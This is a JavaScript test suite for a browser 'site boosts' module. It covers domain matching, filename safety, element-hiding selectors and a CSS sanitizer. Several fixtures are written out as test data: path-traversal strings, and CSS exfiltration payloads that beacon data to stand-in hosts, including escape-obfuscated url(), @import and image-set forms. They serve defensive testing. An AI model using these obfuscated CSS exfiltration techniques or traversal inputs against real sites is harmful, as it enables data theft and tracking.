// b1 — Site Boosts Deterministic: the pure module (SDD RED). Spec:
// overlay/specs/b1-site-boosts-deterministic.md §2, §3, §4 tests 1–16.
//
// Contract pinned here for overlay/chrome/JS/aether-boosts.sys.mjs (pure —
// no Services/DOM/IOUtils at top level; Node-importable):
//   candidateDomains(host) -> ordered match list: exact normalized host
//     (lowercased, port stripped) first, then parent-domain fallback by
//     stripping leading labels down to two. No PSL — naive suffix walk,
//     documented limitation. IP hosts and single-label hosts match exactly
//     only. Empty/hostile input -> [] (never a throw).
//   boostFileName(domain) -> "<domain>.css"-class safe filename: never
//     contains a path separator or "..", so hostile input can never escape
//     the boosts dir.
//   createRegistry(domainsWithFiles) -> in-memory registry over the domains
//     that have boost files; everything starts ENABLED (session-scoped state,
//     no persistence).
//   resolveBoost(registry, host) -> the matched, enabled domain (exact beats
//     parent) or null.
//   setDomainEnabled(registry, domain, on) -> flip a domain's enable state.
//   needsRead(cacheEntry, mtime) -> mtime-cache decision (entry is
//     {mtime} or null/undefined).
//   zapSelector(descriptor) -> selector from {id, classes, tag, nthChain}
//     preferring #id > tag.class-chain > :nth-of-type ancestor path
//     (nthChain: [{tag, nth}, ...] from outermost ancestor to the element).
//     CSS-identifier escaping or clean nth fall-through — never a throw,
//     never an unescaped selector.
//   zapRule(selector, dateStr) -> the appended rule text:
//     dated comment + `display: none !important`.
//   sanitizeCss(css) -> the b2-shared sanitizer: strips the known CSS fetch
//     vectors — @import at-rules, url(...) except data:, image-set()/
//     -webkit-image-set() with non-data: sources — re-checked on the fully
//     CSS-escape-decoded text so '\75 rl(' / '@\69mport' spellings cannot
//     hide; clean CSS passes byte-identical; idempotent.

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  candidateDomains,
  boostFileName,
  createRegistry,
  resolveBoost,
  setDomainEnabled,
  needsRead,
  zapSelector,
  zapRule,
  sanitizeCss,
} from "../../chrome/JS/aether-boosts.sys.mjs";

// The CSS tokenizer decodes escapes before it recognizes url(/@import, so the
// oracle must too — a literal grep would share the sanitizer's old blindspot.
// Independent implementation, deliberately not imported from the module.
function decodeCssEscapes(css) {
  const re = /\\(?:([0-9a-fA-F]{1,6})(?:\r\n|[ \t\n\r\f])?|(\r\n|[\n\r\f])|([\s\S]))/g;
  for (;;) {
    const next = css.replace(re, (_, hex, nl, ch) => {
      if (hex !== undefined) {
        const cp = parseInt(hex, 16);
        return !cp || cp > 0x10ffff ? "�" : String.fromCodePoint(cp);
      }
      return nl !== undefined ? "" : ch;
    });
    if (next === css) return css;
    css = next;
  }
}

// Every fetch vector remaining after sanitizing must be data: — url() args,
// unterminated url( at EOF, @import targets, and image-set()/-webkit-image-
// set() string sources — all matched on the escape-DECODED text. The "zero
// fetchable URLs" oracle used by tests 14 and 16.
function fetchableUrls(css) {
  const d = decodeCssEscapes(css);
  const out = [];
  const re = /url\(\s*(['"]?)([^)'"]*)\1\s*\)/gi;
  let m;
  while ((m = re.exec(d))) {
    const arg = m[2].trim();
    if (!/^data:/i.test(arg)) out.push(m[0]);
  }
  if (/url\([^)]*$/i.test(d)) out.push("url( running unterminated to EOF");
  for (const imp of d.match(/@import\b[^;{]*/gi) ?? []) out.push(imp);
  const isRe = /(?:-webkit-)?image-set\(/gi;
  while ((m = isRe.exec(d))) {
    let depth = 1;
    let i = isRe.lastIndex;
    while (i < d.length && depth > 0) {
      if (d[i] === "(") depth++;
      else if (d[i] === ")") depth--;
      i++;
    }
    const inner = d.slice(isRe.lastIndex, i);
    for (const s of inner.match(/"[^"]*"|'[^']*'/g) ?? []) {
      if (!/^["']data:/i.test(s)) out.push(`image-set source ${s}`);
    }
    isRe.lastIndex = i;
  }
  return out;
}

// 1. ordered candidate walk ---------------------------------------------------

test("boosts: candidateDomains('a.b.example.com') walks down to two labels, exact first", () => {
  assert.deepEqual(candidateDomains("a.b.example.com"), [
    "a.b.example.com",
    "b.example.com",
    "example.com",
  ]);
});

// 2. normalization: case + port ----------------------------------------------

test("boosts: uppercase host and :8080 port collapse to the bare lowercase candidates", () => {
  const bare = candidateDomains("example.com");
  assert.deepEqual(candidateDomains("EXAMPLE.COM"), bare);
  assert.deepEqual(candidateDomains("example.com:8080"), bare);
  assert.deepEqual(candidateDomains("EXAMPLE.COM:8080"), bare);
  assert.deepEqual(
    candidateDomains("Sub.Example.COM:443"),
    candidateDomains("sub.example.com"),
  );
});

// 3. two-label / single-label / IP hosts: exact only ---------------------------

test("boosts: a bare two-label host yields itself only", () => {
  assert.deepEqual(candidateDomains("example.com"), ["example.com"]);
});

test("boosts: single-label host (localhost) matches exactly, no suffix walk", () => {
  assert.deepEqual(candidateDomains("localhost"), ["localhost"]);
});

test("boosts: an IPv4 host never falls back to its trailing octets", () => {
  const c = candidateDomains("192.168.1.10");
  assert.deepEqual(c, ["192.168.1.10"], "an IP is not a domain hierarchy");
  assert.ok(!c.includes("168.1.10"), "no octet-suffix candidates");
  assert.ok(!c.includes("1.10"), "no octet-suffix candidates");
});

test("boosts: an IPv6 host yields exactly one candidate, never a suffix walk", () => {
  const c = candidateDomains("[::1]");
  assert.equal(c.length, 1, `[::1] must match exactly, got ${JSON.stringify(c)}`);
  const c2 = candidateDomains("[2001:db8::7]");
  assert.equal(c2.length, 1, `IPv6 must match exactly, got ${JSON.stringify(c2)}`);
});

test("boosts: a bracketless IPv6 host — Gecko's nsIURI.host form — canonicalizes to the bracketed domain", () => {
  // nsIURI.host returns '::1', NOT '[::1]' (brackets appear only on .hostPort)
  assert.deepEqual(candidateDomains("::1"), ["[::1]"]);
  assert.deepEqual(candidateDomains("2001:db8::7"), ["[2001:db8::7]"]);
  assert.deepEqual(candidateDomains("::ffff:192.0.2.1"), ["[::ffff:192.0.2.1]"], "IPv4-mapped form, exact only");
  // both spellings resolve the same dotfile
  assert.deepEqual(candidateDomains("::1"), candidateDomains("[::1]"));
  assert.deepEqual(candidateDomains("2001:db8::7"), candidateDomains("[2001:db8::7]"));
});

test("boosts: a '[::1].css' dotfile resolves for the bracketless host Gecko reports", () => {
  const reg = createRegistry(["[::1]"]);
  assert.equal(resolveBoost(reg, "::1"), "[::1]");
  assert.equal(resolveBoost(reg, "[::1]"), "[::1]");
});

// 4. hostile input can never escape the boosts dir ----------------------------

test("boosts: boostFileName output carries no path separators and no '..'", () => {
  for (const hostile of [
    "../../etc",
    "..",
    "a/b/c",
    "a\\b\\c",
    "example.com/../../etc/passwd",
    "..example.com",
  ]) {
    const name = boostFileName(hostile);
    assert.equal(typeof name, "string", `boostFileName(${JSON.stringify(hostile)}) yields a string`);
    assert.ok(!name.includes("/"), `no '/' in ${JSON.stringify(name)}`);
    assert.ok(!name.includes("\\"), `no '\\' in ${JSON.stringify(name)}`);
    assert.ok(!name.includes(".."), `no '..' in ${JSON.stringify(name)}`);
  }
});

test("boosts: a well-formed domain maps to its dotfile name", () => {
  const name = boostFileName("example.com");
  assert.ok(name.includes("example.com"), "the domain names the file");
  assert.ok(name.endsWith(".css"), "boost files are CSS dotfiles");
});

test("boosts: empty/invalid host yields no candidates rather than a throw", () => {
  assert.deepEqual(candidateDomains(""), []);
  assert.deepEqual(candidateDomains(null), []);
  assert.deepEqual(candidateDomains(undefined), []);
  assert.deepEqual(candidateDomains("   "), []);
});

// 5. registry resolution: exact beats parent, parent covers the sub -----------

test("boosts: exact host wins when both sub and parent files are present", () => {
  const reg = createRegistry(["sub.example.com", "example.com"]);
  assert.equal(resolveBoost(reg, "sub.example.com"), "sub.example.com");
});

test("boosts: only the parent present -> the parent matches the sub", () => {
  const reg = createRegistry(["example.com"]);
  assert.equal(resolveBoost(reg, "sub.example.com"), "example.com");
  assert.equal(resolveBoost(reg, "a.b.example.com"), "example.com");
});

test("boosts: no matching file -> resolveBoost yields nothing", () => {
  const reg = createRegistry(["example.com"]);
  assert.ok(!resolveBoost(reg, "unrelated.org"), "no invented matches");
});

// 6. per-domain enable state, session-scoped ----------------------------------

test("boosts: setDomainEnabled off blanks that domain; unrelated domains still resolve", () => {
  const reg = createRegistry(["example.com", "other.org"]);
  setDomainEnabled(reg, "example.com", false);
  assert.ok(!resolveBoost(reg, "example.com"), "disabled domain resolves to nothing");
  assert.ok(!resolveBoost(reg, "sub.example.com"), "the sub covered by the disabled parent too");
  assert.equal(resolveBoost(reg, "other.org"), "other.org", "unrelated domain unaffected");
});

test("boosts: re-enable restores resolution", () => {
  const reg = createRegistry(["example.com"]);
  setDomainEnabled(reg, "example.com", false);
  assert.ok(!resolveBoost(reg, "example.com"));
  setDomainEnabled(reg, "example.com", true);
  assert.equal(resolveBoost(reg, "example.com"), "example.com");
});

test("boosts: a fresh registry starts everything enabled — off is session-scoped, never persisted", () => {
  const reg1 = createRegistry(["example.com"]);
  setDomainEnabled(reg1, "example.com", false);
  // relaunch = a new registry; the disable must not leak across
  const reg2 = createRegistry(["example.com"]);
  assert.equal(
    resolveBoost(reg2, "example.com"),
    "example.com",
    "a fresh registry knows nothing of last session's :boost_off",
  );
});

// 7. needsRead: the mtime cache decision, all three ways ----------------------

test("boosts: same mtime -> no re-read", () => {
  assert.equal(needsRead({ mtime: 1000 }, 1000), false);
});

test("boosts: changed mtime -> re-read", () => {
  assert.equal(needsRead({ mtime: 1000 }, 2000), true);
  assert.equal(needsRead({ mtime: 2000 }, 1000), true, "any change means re-read, not just newer");
});

test("boosts: no cache entry -> read", () => {
  assert.equal(needsRead(null, 1000), true);
  assert.equal(needsRead(undefined, 1000), true);
});

// 8. zapSelector: an id trumps everything -------------------------------------

test("boosts: descriptor with an id -> '#id' exactly, ignoring classes and nth", () => {
  const sel = zapSelector({
    id: "promo",
    classes: ["banner", "wide"],
    tag: "div",
    nthChain: [{ tag: "body", nth: 1 }, { tag: "div", nth: 3 }],
  });
  assert.equal(sel, "#promo");
});

// 9. no id, classes present -> tag.class-chain --------------------------------

test("boosts: no id, classes present -> tag.class1.class2 chain", () => {
  const sel = zapSelector({
    id: null,
    classes: ["card", "wide"],
    tag: "div",
    nthChain: [{ tag: "body", nth: 1 }, { tag: "div", nth: 3 }],
  });
  assert.equal(sel, "div.card.wide");
});

// 10. no id, no classes -> deterministic :nth-of-type ancestor path -----------

test("boosts: no id, no classes -> a deterministic :nth-of-type path", () => {
  const descriptor = {
    id: null,
    classes: [],
    tag: "span",
    nthChain: [
      { tag: "main", nth: 1 },
      { tag: "div", nth: 2 },
      { tag: "span", nth: 3 },
    ],
  };
  const sel = zapSelector(descriptor);
  assert.equal(typeof sel, "string");
  assert.ok(sel.length > 0, "never an empty selector");
  assert.ok(sel.includes(":nth-of-type(2)"), `path carries the div's position, got ${sel}`);
  assert.ok(sel.includes(":nth-of-type(3)"), `path carries the span's position, got ${sel}`);
  const mainAt = sel.indexOf("main");
  const divAt = sel.indexOf("div");
  const spanAt = sel.indexOf("span");
  assert.ok(mainAt >= 0 && divAt > mainAt && spanAt > divAt, `ancestor order preserved in ${sel}`);
  // regenerates identically for the same descriptor (fresh deep copy)
  const again = zapSelector(structuredClone(descriptor));
  assert.equal(again, sel, "same descriptor, same selector — deterministic");
});

// 11. CSS-unsafe identifiers: escaped or clean nth fall-through, never a throw

test("boosts: unsafe id/class characters never throw and never leak unescaped", () => {
  const nthChain = [{ tag: "body", nth: 1 }, { tag: "div", nth: 2 }];

  // id with a space
  const spacey = zapSelector({ id: "my id", classes: [], tag: "div", nthChain });
  assert.equal(typeof spacey, "string");
  assert.ok(spacey.length > 0);
  assert.notEqual(spacey, "#my id", "raw unescaped id selector is never emitted");
  if (spacey.startsWith("#")) {
    assert.ok(spacey.includes("\\"), `id form must escape the space, got ${spacey}`);
  }

  // id with a leading digit
  const digity = zapSelector({ id: "1promo", classes: [], tag: "div", nthChain });
  assert.equal(typeof digity, "string");
  assert.ok(digity.length > 0);
  assert.notEqual(digity, "#1promo", "a leading digit is not a valid bare identifier");
  if (digity.startsWith("#")) {
    assert.ok(digity.includes("\\"), `id form must escape the leading digit, got ${digity}`);
  }

  // class with a quote
  const quoty = zapSelector({ id: null, classes: ['a"b'], tag: "div", nthChain });
  assert.equal(typeof quoty, "string");
  assert.ok(quoty.length > 0);
  if (quoty.includes('"')) {
    assert.ok(quoty.includes('\\"'), `quote must be escaped, got ${quoty}`);
  }
});

// 12. zapRule: dated comment + display:none, appends never merge --------------

test("boosts: zapRule carries the selector, display:none !important, and the date in a comment", () => {
  const rule = zapRule("#promo", "2026-08-11");
  assert.ok(rule.includes("#promo"), "the selector is in the rule");
  assert.ok(rule.includes("display: none !important"), "the hide is !important");
  assert.match(rule, /\/\*[^*]*2026-08-11[^*]*\*\//, "the date lives in a comment");
});

test("boosts: two zaps are two independent rules — no merging, no dedup", () => {
  const one = zapRule("#promo", "2026-08-11");
  const again = zapRule("#promo", "2026-08-11");
  assert.equal(again, one, "same input, same rule text");
  const appended = one + again;
  const hides = appended.split("display: none !important").length - 1;
  assert.equal(hides, 2, "appending twice keeps both rules");
  const sels = appended.split("#promo").length - 1;
  assert.equal(sels, 2, "no dedup of identical selectors");
});

// 13. sanitizeCss strips @import in any casing/whitespace form ----------------

test("boosts: sanitizeCss strips @import at-rules, any casing, any form", () => {
  const fixtures = [
    '@import "evil.css";',
    "@IMPORT url(\"http://evil.example/x.css\");",
    "@Import url('https://evil.example/x.css') screen;",
    "@import\n   url( //evil.example/x.css )  print;",
  ];
  for (const imp of fixtures) {
    const out = sanitizeCss(`.keep { color: red; }\n${imp}\n.also { margin: 0; }`);
    assert.ok(!/@import/i.test(out), `@import survived: ${JSON.stringify(out)}`);
    assert.ok(out.includes(".keep"), "benign rule before survives");
    assert.ok(out.includes(".also"), "benign rule after survives");
  }
});

test("boosts: an @import missing its ';' is consumed whole — no dangling block, later rules intact", () => {
  const out = sanitizeCss("@import url(http://evil.example/x)\n.keep{color:red}\n.other { margin: 0; }");
  assert.ok(!/@import/i.test(out), `@import survived: ${JSON.stringify(out)}`);
  assert.ok(out.includes(".other"), "the rule after the malformed at-rule survives");
  const opens = out.split("{").length - 1;
  const closes = out.split("}").length - 1;
  assert.equal(opens, closes, `unbalanced braces left behind: ${JSON.stringify(out)}`);
});

// 14. sanitizeCss strips url(...) except data: ---------------------------------

test("boosts: sanitizeCss strips http/https/protocol-relative/quoted/padded url()", () => {
  const css = [
    '.a { background: url(http://evil.example/a.png); }',
    '.b { background-image: url( "https://evil.example/b.png" ); }',
    ".c { background: url('//evil.example/c.png'); }",
    ".d { background: url(  //evil.example/d.png  ); }",
    ".e { background: url(relative.png); }",
  ].join("\n");
  const out = sanitizeCss(css);
  assert.deepEqual(
    fetchableUrls(out),
    [],
    `fetchable url() survived sanitizing: ${JSON.stringify(out)}`,
  );
});

test("boosts: url(data:...) survives sanitizing", () => {
  const css = ".ok { background: url(data:image/png;base64,AAAA); }";
  const out = sanitizeCss(css);
  assert.ok(
    /url\(\s*['"]?data:/i.test(out),
    `the data: URI must survive, got ${JSON.stringify(out)}`,
  );
});

test("boosts: CSS-escaped spellings of url() and @import cannot hide from the sanitizer", () => {
  // the tokenizer decodes escapes BEFORE recognizing url(/@import
  // (css-syntax-3 §4.3.4) — these all fetch in a real browser
  const fixtures = [
    ".a { background: \\75 rl(http://evil.example/x) }", // \75 -> 'u'
    ".b { background: u\\72 l('http://evil.example/y') }", // \72 -> 'r'
    '@\\69mport "http://evil.example/e.css";', // \69 -> 'i'
    ".c { background: \\75\\72\\6c(//evil.example/z) }", // fully escaped 'url'
  ];
  for (const fx of fixtures) {
    const out = sanitizeCss(fx);
    assert.deepEqual(
      fetchableUrls(out),
      [],
      `escape-hidden fetch survived ${JSON.stringify(fx)}: ${JSON.stringify(out)}`,
    );
    assert.ok(!/@import/i.test(decodeCssEscapes(out)), `escaped @import survived: ${JSON.stringify(out)}`);
  }
});

test("boosts: image-set string sources are stripped — they fetch without any url()", () => {
  const gone = [
    '.a { background: image-set("http://evil.example/1x.png" 1x, "http://evil.example/2x.png" 2x); }',
    ".b { background: -webkit-image-set(url(http://evil.example/w.png) 1x); }",
    '.c { background: IMAGE-SET("//evil.example/p.png" 1x); }',
    ".d { background: image-set(var(--smuggled) 1x); }", // var() could carry a source
  ];
  for (const fx of gone) {
    const out = sanitizeCss(fx);
    assert.deepEqual(fetchableUrls(out), [], `image-set fetch survived: ${JSON.stringify(out)}`);
    assert.ok(!/image-set\(/i.test(out), `unsafe image-set kept: ${JSON.stringify(out)}`);
  }
  // all-data: image-set survives untouched
  const ok = '.ok { background: image-set(url(data:image/png;base64,AA) 1x, "data:image/png;base64,BB" 2x); }';
  assert.equal(sanitizeCss(ok), ok, "data:-only image-set passes byte-identical");
});

// 15. clean CSS passes byte-identical; idempotent ------------------------------

test("boosts: clean CSS passes through byte-identical", () => {
  const clean = [
    "/* my boost */",
    ".sidebar { display: none !important; }",
    "body { font-family: monospace; max-width: 70ch; }",
    "h1 { color: #b16286; }",
  ].join("\n");
  assert.equal(sanitizeCss(clean), clean);
});

test("boosts: the sanitizer is idempotent", () => {
  const dirty = [
    '@import "evil.css";',
    ".keep { color: red; background: url(http://evil.example/x.png); }",
    ".ok { background: url(data:image/gif;base64,R0lGOD); }",
  ].join("\n");
  const once = sanitizeCss(dirty);
  assert.equal(sanitizeCss(once), once, "sanitize(sanitize(x)) === sanitize(x)");
  const clean = ".a { color: blue; }";
  assert.equal(sanitizeCss(sanitizeCss(clean)), sanitizeCss(clean));
});

// 16. the exfil fixture: zero fetchable URLs out, benign rules intact ----------

test("boosts: an exfil fixture comes out with zero fetchable URLs, benign rules intact", () => {
  const exfil = [
    "/* looks legit */",
    ".keep { color: red; }",
    ".beacon { background-image: url(https://exfil.example/p?c=secret); }",
    ".keep2 { margin: 0 auto; }",
    '@import url("https://exfil.example/steal.css");',
    ".keep3 { display: none !important; }",
    // escape-hidden spellings — decoded by the tokenizer before recognition
    ".esc1 { background: \\75 rl(http://exfil.example/esc1) }",
    ".esc2 { background: u\\72 l('http://exfil.example/esc2') }",
    '@\\69mport "http://exfil.example/esc3.css";',
    // string sources that fetch with no url() at all
    '.is1 { background: image-set("http://exfil.example/is.png" 1x); }',
    ".is2 { background: -webkit-image-set(url(http://exfil.example/wis.png) 1x); }",
    ".keep4 { padding: 0; }",
  ].join("\n");
  const out = sanitizeCss(exfil);
  assert.deepEqual(fetchableUrls(out), [], "zero fetchable URLs");
  assert.ok(!/@import/i.test(decodeCssEscapes(out)), "the smuggled @import is gone, escaped spelling included");
  for (const cls of [".keep ", ".keep2", ".keep3", ".keep4"]) {
    assert.ok(out.includes(cls.trim()), `benign rule ${cls.trim()} survives`);
  }
});

// --- b2 extension: the reporting sanitizer form ------------------------------
// Spec overlay/specs/b2-ai-css-boosts.md §3/§4 test 16: b2's acceptance gate
// needs to SHOW what was stripped, so sanitizeCss grows a reporting form —
// sanitizeCssReport(css) -> {css, removedRules[]} — while the plain
// string-in/string-out contract above stays untouched for b1 callers. One
// sanitizer, verified equivalent from the b1 side. Dynamic import so this
// file's b1 tests keep running while the reporting form is unwritten (RED).

test("boosts: sanitizeCssReport returns the same surviving CSS as the plain form on the exfil fixture", async () => {
  const mod = await import("../../chrome/JS/aether-boosts.sys.mjs");
  assert.equal(
    typeof mod.sanitizeCssReport,
    "function",
    "aether-boosts must export the reporting form sanitizeCssReport(css)",
  );
  const exfil = [
    "/* looks legit */",
    ".keep { color: red; }",
    ".beacon { background-image: url(https://exfil.example/p?c=secret); }",
    ".keep2 { margin: 0 auto; }",
    '@import url("https://exfil.example/steal.css");',
    ".keep3 { display: none !important; }",
    ".esc1 { background: \\75 rl(http://exfil.example/esc1) }",
    ".esc2 { background: u\\72 l('http://exfil.example/esc2') }",
    '@\\69mport "http://exfil.example/esc3.css";',
    '.is1 { background: image-set("http://exfil.example/is.png" 1x); }',
    ".is2 { background: -webkit-image-set(url(http://exfil.example/wis.png) 1x); }",
    ".keep4 { padding: 0; }",
  ].join("\n");
  const report = mod.sanitizeCssReport(exfil);
  assert.equal(
    report.css,
    sanitizeCss(exfil),
    "one sanitizer — the reporting form and the plain form agree on the surviving CSS",
  );
  assert.ok(Array.isArray(report.removedRules), "removedRules is an array");
  assert.ok(report.removedRules.length > 0, "the exfil fixture must report removals");
  // and on clean CSS: byte-identical, nothing reported
  const clean = ".a { color: blue; }";
  const cleanReport = mod.sanitizeCssReport(clean);
  assert.equal(cleanReport.css, clean, "clean CSS passes byte-identical through the reporting form");
  assert.deepEqual(cleanReport.removedRules, [], "clean CSS reports no removals");
});
